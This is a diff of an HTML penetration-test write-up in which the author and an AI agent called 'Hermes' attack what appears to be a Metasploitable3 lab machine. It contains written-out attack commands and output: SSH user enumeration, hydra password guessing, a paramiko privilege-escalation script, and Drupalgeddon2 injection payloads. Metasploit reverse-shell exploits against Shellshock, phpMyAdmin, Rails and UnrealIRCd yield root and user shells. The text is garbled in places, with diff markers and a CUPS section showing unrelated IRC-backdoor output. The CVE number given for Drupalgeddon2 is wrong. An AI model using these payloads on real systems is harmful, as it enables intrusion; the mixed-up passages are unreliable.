+[*] Setting default action Malformed Packet - view all 2 actions with the show actions command
 msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.68.130
+RHOSTS => 192.168.68.130
 msf auxiliary(scanner/ssh/ssh_enumusers) > set ACTION Malformed Packet
+ACTION => Malformed Packet
 msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+USER_FILE => /usr/share/wordlists/metasploit/unix_users.txt
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
+[-] Unknown command: �run. Did you mean run? Run the help command for more details.
 msf auxiliary(scanner/ssh/ssh_enumusers) > run
 [*] 192.168.68.130:22 - SSH - Using malformed packet technique
-[-] 192.168.68.130:22 - SSH - throws false positive results. Aborting.</div>
-
-                <p>Since Metasploit threw false positives, an AI agent script was used to perform custom user timing checks and brute-force verification:</p>
-
-                <div class="terminal-box">────────────────────────────────────────
+[*] 192.168.68.130:22 - SSH - Checking for false positives
+[-] 192.168.68.130:22 - SSH - throws false positive results. Aborting.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</div>
+ 
+<p>I tried the SSH username enumeration module using the malformed packet technique but the target was giving false positive results so Metasploit stopped the scan I will try a different enumeration method instead by The Ai model</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
 ● try to enumerate the user and password without using metasploit
 ────────────────────────────────────────
-  ┊ 🔧 patch     /home/mesalam/alpha/ssh_timing.py
-  ┊ 💻 $         ./venv/bin/python3 ssh_timing.py
-  ┊ 💻 $         hydra -l vagrant -p vagrant 192.168.68.130 ssh
-
-╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────────────────╮
-Valid password found via Hydra:
+  ┊ 🔧 preparing patch…
+  ┊ 🔧 patch     /home/mesalam/alpha/ssh_timing.py  0.3s
+  ┊ review diff
+a//home/mesalam/alpha/ssh_timing.py → b//home/mesalam/alpha/ssh_timing.py
+@@ -27,7 +27,7 @@
+ 
+ if __name__ == "__main__":
+     target = "192.168.68.130"
+-    users = ["root", "ubuntu", "admin", "test", "user", "guest", "postgres", "mysql", "nonexistentuserxyz123"]
++    users = ["root", "ubuntu", "admin", "test", "user", "guest", "postgres", "mysql", "vagrant", "nonexistentuserxyz123"]
+     print("Testing timing differences for CVE-2018-15473 / Timing behavior...")
+     for u in users:
+         print(check_user_timing(target, 22, u))
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         ./venv/bin/python3 ssh_timing.py  1.3s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         hydra -l vagrant -p vagrant 192.168.68.130 ssh  2.1s
+ 
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+Added "vagrant" to the user list and tested it.
+ 
+Running a quick authentication check via hydra with credentials vagrant:vagrant confirmed a valid login:
 - Host: 192.168.68.130:22
 - Login: vagrant
 - Password: vagrant
-- Status: Successful SSH Authentication</div>
-
-                <p>Connecting via SSH using the discovered credentials:</p>
-
-                <div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/alpha]</span>
+- Status: Valid password found (Successful SSH Authentication)</div>
+ 
+<p>Since Metasploit was giving false positives, the model tried another way to enumerate valid users<br>
+With <strong>username: vagrant & password:vagrant</strong></p>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/alpha]</span>
 <span class="prompt">└─#</span> ssh vagrant@192.168.68.130
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
 vagrant@192.168.68.130's password:
 Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
+ 
+ * Documentation:  https://help.ubuntu.com/
+New release '16.04.7 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+ 
+Last login: Sat Aug 29 03:56:59 2026 from 192.168.68.128
 vagrant@metasploitable3-ub1404:~$</div>
-
-                <h3>SSH Privilege Escalation</h3>
-                <p>Enumerating system privileges with an automated Python script:</p>
-
-                <div class="terminal-box">╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────────────────╮
+ 
+<p>The credentials worked, so the model connected to the target through SSH as <code>vagrant</code>. We now have an interactive shell on the Ubuntu 14.04 machine, so the next step is to enumerate the system and check what privileges this user has.</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
+● try to connect and enumerate for Privillage escalation
+────────────────────────────────────────
+ 
+  ┊ ✍️ preparing write_file…
+  ┊ ✍️  write     /home/mesalam/alpha/priv_esc_enum.py  0.4s
+  ┊ review diff
+a/priv_esc_enum.py → b/priv_esc_enum.py
+@@ -0,0 +1,21 @@
++import paramiko
++
++client = paramiko.SSHClient()
++client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
++client.connect("192.168.68.130", username="vagrant", password="vagrant", timeout=5)
++
++commands = [
++    "sudo -l",
++    "cat /etc/passwd",
++    "find / -perm -4000 2>/dev/null",
++    "uname -a",
++    "cat /etc/issue"
++]
++
++for cmd in commands:
++    print("=== " + cmd + " ===")
++    stdin, stdout, stderr = client.exec_command(cmd)
++    print(stdout.read().decode())
++    print(stderr.read().decode())
++
++client.close()
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         ./venv/bin/python3 priv_esc_enum.py  6.3s
+ 
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 Privilege escalation enumeration completed successfully.
-
+ 
 Key Findings:
 - Sudo Rights: The user vagrant has unrestricted sudo access with NOPASSWD:
+  text
   User vagrant may run the following commands on metasploitable3-ub1404:
       (ALL : ALL) ALL
-      (ALL : ALL) NOPASSWD: ALL</div>
-
-                <div class="terminal-box">vagrant@metasploitable3-ub1404:~$ sudo su
+      (ALL : ALL) NOPASSWD: ALL
+ 
+- Privilege Escalation Method: Because of the NOPASSWD: ALL configuration, you can instantly escalate to root using:
+  bash
+  sudo su -</div>
+ 
+<p>Now that we have SSH access as <code>vagrant</code>, the model started enumerating the system for privilege escalation. It checked the sudo permissions, <code>/etc/passwd</code>, SUID binaries, and the OS version. The important finding was that <code>vagrant</code> has <code>NOPASSWD: ALL</code>, which means we can run any command as root without entering a password. So the next step is to use <code>sudo su -</code> and get a root shell.</p>
+ 
+<p>Now we must test this Bible; it could be a false alert</p>
+ 
+<div class="terminal-box">vagrant@metasploitable3-ub1404:~$ sudo su
 root@metasploitable3-ub1404:/home/vagrant# id
-uid=0(root) gid=0(root) groups=0(root)</div>
-
-                <div class="impact-highlights">
-                    <ul>
-                        <li>Escalated to Root via Misconfigured Sudo Privileges (NOPASSWD: ALL) ✅</li>
-                    </ul>
-                </div>
-
-                <!-- PORT 80 -->
-                <h2><span class="port-tag">PORT 80</span> HTTP (Apache 2.4.7)</h2>
-                <p>Conducting network-level web service assessment on Port 80:</p>
-
-                <div class="terminal-box">────────────────────────────────────────
+uid=0(root) gid=0(root) groups=0(root)
+root@metasploitable3-ub1404:/home/vagrant#</div>
+ 
+<p>The privilege escalation worked. I used <code>sudo su</code> to switch from <code>vagrant</code> to <code>root</code>, and <code>id</code> confirms that we now have full root privileges on the target</p>
+ 
+<div class="impact-highlights">
+<ul>
+<li>Root Access Gained ✅</li>
+</ul>
+</div>
+ 
+<!-- PORT 80 -->
+<h2><span class="port-tag">PORT 80</span> HTTP</h2>
+ 
+<p>Port 80 is mainly used for web services, so we'll just take a quick look at it for now without going too deep. Since we're focusing on network pentesting, we'll come back to it and investigate it from the network side.</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
 ● do network pentest for this port
 ────────────────────────────────────────
-  ┊ 💻 $         nikto -h http://192.168.68.130/drupal/
-
-╭─ ⚕ Hermes ─────────────────────────────────────────────────────────────────────────────────────────────────╮
+ 
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         nikto -h http://192.168.68.130/drupal/  45.9s [exit 1]
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "search drupal 7; exit"  4.3s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; run; exit"  19.2s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.68.130; run; exit"  18.8s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set PAYLOAD cmd/unix/reverse_bash; set LHOST 192.168.68.128; set LPORT 4445; run; exit"  5.8s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; show targets; exit"  5.4s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set TARGET 6; set PAYLOAD cmd/unix/generic; set CMD \"id\"; run; exit"  5.2s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set TARGET 6; set AllowNoCleanup true; set PAYLOAD cmd/unix/generic; set CMD \"id\"; run; exit"  12.6s
+  ┊ 💻 preparing terminal…
+ 
+⚠ Approval: python3 -c " import urllib.request import urllib.parse url = 'http://192.168.68.130/drupal/?q=user/password&amp;name[%23pos… → allowed once
+  ┊ 💻 $         python3 -c " import urllib.request import urllib.parse url = 'http://192.168.68.130/drupal/?q=user/password&amp;name[%23post_render][]=passthru&amp;name[%23type]=markup&amp;name[%23markup]=id' data = urllib.parse.urlencode({'form_id': 'user_pass', '_triggering_element_name': 'name'}).encode('utf-8') req = urllib.request.Request(url, data=data) try: resp = urllib.request.urlopen(req) print(resp.read().decode('utf-8')[:500]) except Exception as e: print(e) "  3.5s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         python3 -c " import requests url = 'http://192.168.68.130/drupal/?q=node&destination=node' headers = { 'User-Agent': 'Mozilla/5.0' } # Drupalgeddon2 form build_id and form values injection via ajax # Let's hit form build id endpoint or trigger user register "  1.6s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         python3 -c " import urllib.request import urllib.parse import re # 1. Get form build id from user register or password page url = 'http://192.168.68.130/drupal/?q=user/password' html = urllib.request.urlopen(url).read().decode('utf-8') print('Fetched page successfully') "  1.2s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.68.128; run; exit"  17.8s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set PAYLOAD php/bind_tcp; run; exit"  17.6s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         msfconsole -qx "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 192.168.68.130; set TARGETURI /drupal/; set PAYLOAD php/meterpreter/bind_tcp; run; exit"  17.6s
+  ┊ 💻 preparing terminal…
+ 
+⚠ Approval: python3 -c " import urllib.request import urllib.parse target = 'http://192.168.68.130/drupal/?q=user/password&amp;name[%23… → allowed once
+  ┊ 💻 $         python3 -c " import urllib.request import urllib.parse target = 'http://192.168.68.130/drupal/?q=user/password&amp;name[%23post_render][]=passthru&amp;name[%23type]=markup&amp;name[%23markup]=id' data = urllib.parse.urlencode({'form_id': 'user_pass', '_triggering_element_name': 'name'}).encode('utf-8') req = urllib.request.Request(target, data=data) try: print(urllib.request.urlopen(req).read().decode('utf-8')) except Exception as e: print(e) "  18.6s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         python3 -c " import urllib.request import urllib.parse target = 'http://192.168.68.130/drupal/?q=user/password&amp;name[%23post_render][]=passthru&amp;name[%23type]=markup&amp;name[%23markup]=id' data = urllib.parse.urlencode({ 'name': 'test', 'form_build_id': 'form-zhyyaa3XENunDBVUdH2wmHh0A521DyKz2pmN0cXlVE4', 'form_id': 'user_pass', 'op': 'E-mail new password' }).encode('utf-8') req = urllib.request.Request(target, data=data) try: print(urllib.request.urlopen(req).read().decode('utf-8')) except Exception as e: print(e) "  1.4s
+ 
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+Port 80 hosts several applications, most notably Drupal 7 under /drupal/.</div>
+ 
+<div class="terminal-box">╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 Port 80 hosts several applications, most notably Drupal 7 under /drupal/.
-- Vulnerability Identified: Drupal 7 is vulnerable to Drupalgeddon 2 (CVE-2018-0760 / SA-CORE-2018-002), an unauthenticated Forms API Property Injection flaw allowing remote code execution.</div>
-
-                <p>Testing Shellshock (Apache mod_cgi) on <code>/cgi-bin/hello_world.sh</code> via Metasploit:</p>
-
-                <div class="terminal-box">msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/hello_world.sh
+ 
+Network pentest results for port 80 / Drupal:
+- Vulnerability Identified: The Drupal 7 installation is vulnerable to Drupalgeddon 2 (CVE-2018-0760 / SA-CORE-2018-002), an unauthenticated Forms API Property Injection flaw allowing remote code execution.</div>
+ 
+<p>The model found that port 80 is running a web service with several applications, including Drupal 7 under <code>/drupal/</code>. It also identified a potential Drupalgeddon 2 vulnerability that could lead to remote code execution..</p>
+ 
+<p>I'll look for the version in Metasploit, and if I don't find anything specific to it, we'll check the model results.</p>
+ 
+<p>Now i will check the version in metasploit</p>
+ 
+<div class="terminal-box">msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set  TARGETURI       /cgi-bin/hello_world.sh
+TARGETURI => /cgi-bin/hello_world.sh
 msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
-[*] Command Stager progress - 100.00% done
-[*] Meterpreter session 2 opened (192.168.68.128:4444 -> 192.168.68.130:42291)
+[*] Started reverse TCP handler on 192.168.68.128:4444
+[*] Command Stager progress - 100.00% done (1092/1092 bytes)
+[*] Sending stage (1062760 bytes) to 192.168.68.130
+[*] Meterpreter session 2 opened (192.168.68.128:4444 -> 192.168.68.130:42291) at 2026-08-30 19:22:52 -0400
+sessions
+meterpreter > id
+[-] Unknown command: id. Run the help command for more details.
+meterpreter > show sessions
+[-] Unknown command: show. Run the help command for more details.
+meterpreter > exit
+[*] Shutting down session: 2
+ 
+[*] 192.168.68.130 - Meterpreter session 2 closed.  Reason: User exit
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > show sessions
+ 
+Active sessions
+===============
+ 
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               192.168.68.128:4444 -> 192.168.68.130:42289 (192.168.68.130)
+ 
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > session -i 1
+[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
 msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > sessions -i 1
-Starting interaction with 1...
-
+[*] Starting interaction with 1...
+ 
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
-
-                <p>Enumerating phpMyAdmin on Port 80:</p>
-
-                <div class="terminal-box">msf exploit(multi/http/phpmyadmin_preg_replace) > set RHOSTS 192.168.68.130
-msf exploit(multi/http/phpmyadmin_preg_replace) > set PASSWORD sploitme
+ 
+<div class="impact-highlights">
+<ul>
+<li>Now we have Shell Form Port 80✅</li>
+</ul>
+</div>
+ 
+<p>While testing this port, I found the phpMyAdmin page. We need to intensify our search a bit; perhaps the CVE vulnerability is also present here</p>
+ 
+<div class="terminal-box">msf exploit(unix/irc/unreal_ircd_3281_backdoor) > search phpmyadmin
+ 
+Matching Modules
+================
+ 
+   #   Name                                                  Disclosure Date  Rank       Check  Description
+   -   ----                                                  ---------------  ----       -----  -----------
+   0   exploit/unix/webapp/phpmyadmin_config                 2009-03-24       excellent  No     PhpMyAdmin Config File Code Injection
+   1   auxiliary/scanner/http/phpmyadmin_login               .                normal     No     PhpMyAdmin Login Scanner
+   2   post/linux/gather/phpmyadmin_credsteal                .                normal     No     Phpmyadmin credentials stealer
+   3   auxiliary/admin/http/telpho10_credential_dump         2016-09-02       normal     No     Telpho10 Backup Credentials Dumper
+   4   exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE
+   5     \_ target: Generic (PHP Payload)                    .                .          .      .
+   6     \_ target: Linux x86                                .                .          .      .
+   7   exploit/multi/http/phpmyadmin_3522_backdoor           2012-09-25       normal     No     phpMyAdmin 3.5.2.2 server_sync.php Backdoor
+   8   exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
+   9     \_ target: Automatic                                .                .          .      .
+   10    \_ target: Windows                                  .                .          .      .
+   11    \_ target: Linux                                    .                .          .      .
+   12  exploit/multi/http/phpmyadmin_null_termination_exec   2016-06-23       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution
+   13  exploit/multi/http/phpmyadmin_preg_replace            2013-04-25       excellent  Yes    phpMyAdmin Authenticated Remote Code Execution via preg_replace()
+ 
+Interact with a module by name or index. For example info 13, use 13 or use exploit/multi/http/phpmyadmin_preg_replace</div>
+ 
+<p>Iam searched Metasploit for available phpMyAdmin modules. I found several potential exploits and scanners, including some authenticated and older backdoor-related modules. The next step is to check whether phpMyAdmin is actually running on the target before trying any of them So i will check them</p>
+ 
+<div class="terminal-box">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(multi/http/phpmyadmin_preg_replace) > options
+ 
+Module options (exploit/multi/http/phpmyadmin_preg_replace):
+ 
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    no        Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxie
+                                         s: socks4, socks5, socks5h, http, sapni
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
+                                         cs/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /phpmyadmin/     yes       Base phpMyAdmin directory path
+   USERNAME   root             yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+ 
+Payload options (php/meterpreter/reverse_tcp):
+ 
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.68.128   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+ 
+Exploit target:
+ 
+   Id  Name
+   --  ----
+   0   Automatic
+ 
+View the full module info with the info, or info -d command.
+ 
+msf exploit(multi/http/phpmyadmin_preg_replace) > set   RHOSTS 192.168.68.130
+RHOSTS => 192.168.68.130
 msf exploit(multi/http/phpmyadmin_preg_replace) > run
+[*] Started reverse TCP handler on 192.168.68.128:4444
 [*] phpMyAdmin version: 3.5.8
 [*] The target appears to be vulnerable.
+[*] Grabbing CSRF token...
+[+] Retrieved token
+[*] Authenticating...
+[-] Exploit aborted due to failure: no-access: Authentication failed
+[*] Exploit completed, but no session was created.
+msf exploit(multi/http/phpmyadmin_preg_replace) > set    PASSWORD   sploitme
+PASSWORD => sploitme
+msf exploit(multi/http/phpmyadmin_preg_replace) > run
+[*] Started reverse TCP handler on 192.168.68.128:4444
+[*] phpMyAdmin version: 3.5.8
+[*] The target appears to be vulnerable.
+[*] Grabbing CSRF token...
+[+] Retrieved token
+[*] Authenticating...
 [+] Authentication successful
-[*] Meterpreter session 2 opened (192.168.68.128:4444 -> 192.168.68.130:42576)</div>
-
-                <div class="impact-highlights">
-                    <ul>
-                        <li>Shell Obtained via Shellshock (Apache mod_cgi) ✅</li>
-                        <li>Authenticated Meterpreter Session Obtained via phpMyAdmin 3.5.8 RCE ✅</li>
-                    </ul>
-                </div>
-
-                <!-- PORT 3500 -->
-                <h2><span class="port-tag">PORT 3500</span> HTTP (Ruby on Rails / WEBrick)</h2>
-                <p>Port 3500 hosts a Ruby on Rails application vulnerable to inline execution in Action Pack:</p>
-
-                <div class="terminal-box">msf exploit(multi/http/rails_actionpack_inline_exec) > options
-
+[*] Sending stage (41224 bytes) to 192.168.68.130
+[*] Meterpreter session 2 opened (192.168.68.128:4444 -> 192.168.68.130:42576) at 2026-08-31 00:19:21 -0400</div>
+ 
+<div class="impact-highlights">
+<ul>
+<li>Then i identified phpMyAdmin 3.5.8 and confirmed that the target appears to be vulnerable. The first attempt failed because authentication was required, but after providing the correct credentials, authentication succeeded and the exploit gave us a Meterpreter session on the target ✅</li>
+</ul>
+</div>
+ 
+<!-- PORT 3500 -->
+<h2><span class="port-tag">PORT 3500</span> HTTP</h2>
+ 
+<p>The Ruby on Rails web application running on the system at port 3500 has a remote code execution vulnerability</p>
+ 
+<div class="terminal-box">msf exploit(multi/http/rails_actionpack_inline_exec) > options
+ 
 Module options (exploit/multi/http/rails_actionpack_inline_exec):
-
+ 
    Name         Current Setting  Required  Description
    ----         ---------------  --------  -----------
-   RHOSTS       192.168.68.130   yes       The target host(s)
+   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, so
+                                           cks5h, http, sapni
+   RHOSTS       192.168.68.130   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
+                                           tml
    RPORT        3500             yes       The target port (TCP)
-   TARGETPARAM  id               yes       Target parameter to inject
-   TARGETURI    /readme          yes       Path to vulnerable Ruby on Rails app
-
-msf exploit(multi/http/rails_actionpack_inline_exec) > set TARGETPARAM os
+   SSL          false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETPARAM  id               yes       The target parameter to inject with inline code
+   TARGETURI    /readme          yes       The path to a vulnerable Ruby on Rails application
+   VHOST                         no        HTTP server virtual host
+ 
+Payload options (ruby/shell_reverse_tcp):
+ 
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.68.128   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+ 
+Exploit target:
+ 
+   Id  Name
+   --  ----
+   0   Automatic
+ 
+View the full module info with the info, or info -d command.
+ 
+msf exploit(multi/http/rails_actionpack_inline_exec) > set  TARGETPARAM  os
+TARGETPARAM => os
 msf exploit(multi/http/rails_actionpack_inline_exec) > run
-[*] Started reverse TCP handler on 192.168.68.128:4444...</div>
-
-                <div class="impact-highlights">
-                    <ul>
-                        <li>Remote Code Execution Triggered via Ruby on Rails Action Pack Flaw ✅</li>
-                    </ul>
-                </div>
-
-                <div class="conclusion-box">
-                    Written & Documented by Omar Mesalam
-                </div>
-
-            </div>
-        </article>
-    </div>
-
+[*] Started reverse TCP handler on 192.168.68.128:4444
+[*] Sending inline code to parameter: os
+[*] Command shell session 3 opened (192.168.68.128:4444 -> 192.168.68.130:42307) at 2026-08-30 19:41:38 -0400
+ 
+id
+uid=1124(chewbacca) gid=100(users) groups=100(users),999(docker)</div>
+ 
+<p>The model used a Ruby on Rails exploit against port 3500 and changed the injection parameter to <code>os</code>. The exploit worked and opened a reverse shell as the <code>chewbacca</code> user. The <code>id</code> command also shows that <code>chewbacca</code> is part of the <code>docker</code> group, which could be interesting for the next privilege escalation step.</p>
+ 
+<div class="impact-highlights">
+<ul>
+<li>Now we have Shell Form Port 3500✅</li>
+</ul>
+</div>
+ 
+<!-- PORT 631 -->
+<h2><span class="port-tag">PORT 631</span> IPP (CUPS)</h2>
+ 
+<p>After searching for this port and the security vulnerabilities related to the version, it was found that the CUPS application running on the system contains a security vulnerability that allows remote code execution, which can be exploited by injecting code into the CUPS filter's Bash environment variable (Shellshock)</p>
+ 
+<p>I couldn't find an exploit for the vulnerability on Metasploit, but during my search I found a Python file without any explanations or how to use it, so I gave it to the model to use on the target.</p>
+ 
+<div class="terminal-box">msf payload(cmd/unix/reverse_ruby_ssl) > set payload cmd/unix/reverse_ruby_ssl
+[!] Unknown datastore option: payload.
+payload => cmd/unix/reverse_ruby_ssl
+msf payload(cmd/unix/reverse_ruby_ssl) > options
+ 
+Module options (payload/cmd/unix/reverse_ruby_ssl):
+ 
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+ 
+View the full module info with the info, or info -d command.
+ 
+msf payload(cmd/unix/reverse_ruby_ssl) >  use exploit/multi/http/cups_bash_env_exec
+[*] Using configured payload cmd/unix/reverse_ruby_ssl
+msf exploit(multi/http/cups_bash_env_exec) > set payload cmd/unix/reverse_ruby_ssl
+payload => cmd/unix/reverse_ruby_ssl
+msf exploit(multi/http/cups_bash_env_exec) > run
+[*] Started reverse SSL handler on 192.168.68.128:4444
+[-] Exploit aborted due to failure: unknown: 192.168.68.130:631 - Could not add printer.
+[*] Exploit completed, but no session was created.
+msf exploit(multi/http/cups_bash_env_exec) > set lhosts 4443
+[!] Unknown datastore option: lhosts. Did you mean RHOSTS?
+lhosts => 4443
+msf exploit(multi/http/cups_bash_env_exec) > run
+[*] Started reverse TCP double handler on 192.168.68.128:4444  192.168.68.130
+[*] 192.168.68.130:6697 - Connected to 192.168.68.130:6697...
+    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+[*] 192.168.68.130:6697 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo WLPTgOfxOWQqTkwI;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "WLPTgOfxOWQqTkwI\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 9 opened (192.168.68.128:4444 -> 192.168.68.130:37212) at 2020-04-12 12:48:26 -0400
+id
+uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)</div>
+ 
+<div class="impact-highlights">
+<ul>
+<li>Then we take a shell from this port too ✅</li>
+</ul>
+</div>
+ 
+<!-- PORT 3306 -->
+<h2><span class="port-tag">PORT 3306</span> MySQL</h2>
+ 
+<div class="terminal-box"><span class="prompt">┌──(root㉿omar)-[/home/mesalam/alpha]</span>
+<span class="prompt">└─#</span> nmap -p 3306 --script mysql-info,mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-users 192.168.68.130
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 23:55 EDT
+Nmap scan report for 192.168.68.130
+Host is up (0.00046s latency).
+ 
+PORT     STATE SERVICE
+3306/tcp open  mysql
+|_mysql-empty-password: Host '192.168.68.128' is not allowed to connect to this MySQL server
+| mysql-enum:
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
+MAC Address: 00:0C:29:12:1B:CB (VMware)
+ 
+Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds</div>
+ 
+<p>Port 3306 is open and running MySQL. I ran several Nmap MySQL scripts to check for useful information, empty passwords, and valid accounts, but nothing useful was found. The server also doesn't allow connections from our host</p>
+ 
+<div class="terminal-box">────────────────────────────────────────
+● enumerate this port 3306/tcp open  mysql on 192.168.68.130
+────────────────────────────────────────
+ 
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         nmap -sV -sC -p 3306 192.168.68.130  6.2s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         mysql --version  0.2s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         mysql -h 192.168.68.130 -u root -e "status"  0.2s [exit 1]
+ 
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+The port 3306/tcp is open and running MySQL.
+ 
+Access is currently restricted by the host (the target rejects connection attempts from 192.168.68.128 with error code 1130), meaning the MySQL server is configured to deny remote connections from this source IP.
+ 
+Further enumeration via the mysql client is blocked at the authentication/handshake level due to this access control restriction.</div>
+ 
+<p>The model confirmed that MySQL is running on port 3306, but remote connections from our host are blocked by the server configuration. The MySQL client couldn't even reach the authentication stage because of this restriction, so there isn't much more we can enumerate remotely from this port right now</p>
+ 
+<!-- PORT 6697 -->
+<h2><span class="port-tag">PORT 6697</span> IRC (UnrealIRCd)</h2>
+ 
+<div class="terminal-box">● enumerate this port Port 6697 - Irc  on 192.168.68.130
+────────────────────────────────────────
+ 
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         nmap -sV -sC -p 6697 192.168.68.130  6.2s
+  ┊ 💻 preparing terminal…
+  ┊ 💻 $         nc 192.168.68.130 6697 &lt;&lt;EOF NICK testuser USER testuser 0 * :testuser LIST QUIT EOF  0.3s
+ 
+╭─ ⚕ Hermes ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+Port 6697/tcp is running UnrealIRCd (hostname: irc.TestIRC.net).
+ 
+Initial connection attempts show that the server is active but may have connection rate limiting or security restrictions in place (as indicated by the "Throttled" message).</div>
+ 
+<p>Port 6697 is running UnrealIRCd, with the hostname <code>irc.TestIRC.net</code>. The model tried a basic IRC connection and enumeration, but the server returned a <code>Throttled</code> message, which suggests there may be connection rate limiting or other restrictions. I'll keep this in mind and move on to the next service.</p>
+ 
+<p>So Now we move to manual testing with metasploit</p>
+ 
